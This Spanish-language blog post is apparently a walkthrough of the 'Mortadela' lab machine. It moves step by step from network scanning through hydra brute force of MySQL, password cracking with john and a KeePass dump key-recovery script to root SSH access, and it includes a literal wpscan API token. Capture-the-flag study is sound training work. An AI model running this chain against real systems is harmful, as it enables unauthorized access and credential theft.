---
layout: post
title: "Mortadela"
date: 2024-06-06 18:10:23
category: hackerlabs
vm: hackerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Mortadela </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://thehackerslabs.com/mortadela/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/thehackerlabs/Mortadela/host.png){:.margin}

**1\.** Identifico el host en la red.

`sudo arp-scan -I enp2s0 --localnet`

![img](/notas/public/img/thehackerlabs/Mortadela/arp.png){:.margin}

**2\.** Escaneo puertos y servicios activos en la maquina.

`sudo nmap -p- --open -n -Pn -T5 -sCV --min-rate=5000 192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/nmap.png){:.margin}

**3\.** En la web tenemos la pagina default de Apache.

`http://192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/80.png){:.margin}

**4\.** Fuzzing de directorios y ficheros en la web.

`gobuster dir -u http://192.168.1.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html`

![img](/notas/public/img/thehackerlabs/Mortadela/gobuster.png){:.margin}

**5\.** Tenemos un wordpress pero con algun problemita, intenta cargar internamente recursos de otra ip; hago resolucion de ip con una regla de iptable.

`sudo iptables -t nat -A OUTPUT -d 192.168.0.108 -j DNAT --to-destination 192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/80code.png){:.margin}
![img](/notas/public/img/thehackerlabs/Mortadela/80ok.png){:.margin}

**6\.** Escaneo fallos en la web wordpress, encuentro poco mas de un usuario.

`wpscan --url http://192.168.1.3/wordpress/ --api-token="ikrj65a1YQMVwLNmjpYaWNM0dJcHjgsBracjFNRr2OI" -e`

![img](/notas/public/img/thehackerlabs/Mortadela/wpscan.png){:.margin}

**7\.** Luego de intentar mucho opte por hacer fuerza bruta al mysql con el usuario root.

`hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/hydra.png){:.margin}

**8\.** Investigando en las bases de datos mysql.

_\- Inicio en mysql_

`mysql -u root -h 192.168.1.3 -pcassandra`

![img](/notas/public/img/thehackerlabs/Mortadela/mysql.png){:.margin}

_\- Encuentro la contraseña del usuario mortadela_

`show databases;`

`use confidencial;`

`show tables;`

`select * from usuarios;`

![img](/notas/public/img/thehackerlabs/Mortadela/mortadelapass.png){:.margin}

**9\.** Accedo por ssh como usuario mortadela.

`ssh mortadela@192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/sshmortadela.png){:.margin}

**10\.** Encuentro un zip que contiene archivos de keepass, pero necesito una contraseña para descomprimir.

`ls /opt`

`unzip -l /opt/muyconfidencial.zip`

`unzip /opt/muyconfidencial.zip`

![img](/notas/public/img/thehackerlabs/Mortadela/unzip.png){:.margin}

**11\.** Me descargo el comprimido a mi maquina local.

`scp -r mortadela@192.168.1.3:/opt/muyconfidencial.zip .`

![img](/notas/public/img/thehackerlabs/Mortadela/scp.png){:.margin}

**12\.** Crackeando la contraseña del comprimido.

`zip2john muyconfidencial.zip > hash`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

![img](/notas/public/img/thehackerlabs/Mortadela/john.png){:.margin}

_\- Descomprimiendo_

`unzip muyconfidencial.zip`

![img](/notas/public/img/thehackerlabs/Mortadela/unzipok.png){:.margin}

**13\.** Extraigo informacion del archivo volcado de keepass, me da posibles contraseñas y un caracter faltante al inicio.

`wget https://raw.githubusercontent.com/matro7sh/keepass-dump-masterkey/main/poc.py -q`

`python3 poc.py KeePass.DMP`

![img](/notas/public/img/thehackerlabs/Mortadela/dump.png){:.margin}

**14\.** Abrimos el database con keepass.

_\- Luego de varios intentos doy con la contraseña correcta_

![img](/notas/public/img/thehackerlabs/Mortadela/keepass.png){:.margin}

_\- Tengo las credenciales de root_

![img](/notas/public/img/thehackerlabs/Mortadela/keepassroot.png){:.margin}

**15\.** Obteniendo superusuario.

`ssh root@192.168.1.3`

![img](/notas/public/img/thehackerlabs/Mortadela/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>